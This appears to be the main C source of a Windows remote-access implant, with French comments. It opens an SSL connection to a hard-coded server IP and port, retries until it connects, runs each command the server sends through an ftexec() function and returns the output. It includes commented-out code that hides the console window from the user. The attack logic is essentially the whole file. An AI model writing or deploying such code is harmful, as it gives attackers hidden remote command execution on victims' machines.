#include <winsock2.h>
#include <windows.h>

#include "proto.h"
#include <stdio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#pragma comment(lib, "libeay32.lib")
#pragma comment(lib, "ssleay32.lib")

#define SERVER_IP "192.168.1.53"
#define SERVER_PORT 1234

    //HWND myWindows = GetConsoleWindow(); //Cache le prompt pour l'utilisateur
    //ShowWindow(myWindows, SW_HIDE);

void ProcessFunction() {
    // La fonction que vous voulez exécuter en parallèle

    while (1) {
        // Votre traitement ici
        // Par exemple :
        printf("Fonction en cours d'exécution...\n");
        Sleep(3000); // Attente d'une seconde pour simuler un traitement
    }
}

int main()
{
    // Initialisation d'OpenSSL pour le contexte de chiffrement

    SSL_library_init();
    SSL_CTX *ssl_ctx = SSL_CTX_new(SSLv23_client_method());
    if (!ssl_ctx)
    {
        //printf("Erreur lors de l'initialisation d'OpenSSL\n");
        return 1;
    }

    // Initialisation de Winsock pour les sockets

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        //printf("Erreur lors de l'initialisation de Winsock\n");
        return 1;
    }


    // Création d'un thread pour exécuter la fonction en parallèle
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ProcessFunction, NULL, 0, NULL);
    if (hThread == NULL) {
        // Gestion des erreurs
        return 1;
    }


    SOCKET sock;
    SOCKADDR_IN serverAddr;
    SSL *ssl = NULL; // Déclarer ssl ici

    // Boucle de tentative de connexion
    while (1)
    {
        // Création du socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET)
        {
            //printf("Erreur lors de la création du socket\n");
            Sleep(5000); // Attend 5 secondes avant de réessayer
            continue;    // Retourne au début de la boucle pour une nouvelle tentative
        }

        // Configuration de l'adresse du serveur
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(SERVER_PORT);
        serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

        // Connexion au serveur

        if (connect(sock, (SOCKADDR *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            //printf("Erreur lors de la connexion au serveur\n");
            closesocket(sock);
            Sleep(5000); 
            continue;    
        }

        // Connexion SSL
        ssl = SSL_new(ssl_ctx);
        SSL_set_fd(ssl, sock);

        if (SSL_connect(ssl) == -1)
        {
            //printf("Erreur lors de la connexion SSL\n");
            ERR_print_errors_fp(stderr);
            SSL_free(ssl);
            closesocket(sock);
            Sleep(5000); 
            continue;    // Retourne au début de la boucle pour une nouvelle tentative de connetion en SSL
        }

        break;
    }

    // Boucle de réception et traitement des données

    while (1)
    {
        char buffer[1024];
        int bytesReceived = SSL_read(ssl, buffer, sizeof(buffer));
        if (bytesReceived > 0)
        {
            buffer[bytesReceived] = '\0';
            //printf(buffer);
            const char *result = ftexec(buffer);
            printf("DEPUIS LE MAIN : %s \n",result);
            SSL_write(ssl, result, strlen(result));

            
        }
        else
        {
            //printf("Erreur réception du message du serveur\n");
            break; // Sortir de la boucle en cas d'erreur
        }
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    // Nettoyage et fermeture
    SSL_free(ssl);
    closesocket(sock);
    WSACleanup();
    SSL_CTX_free(ssl_ctx);

    return 0;
}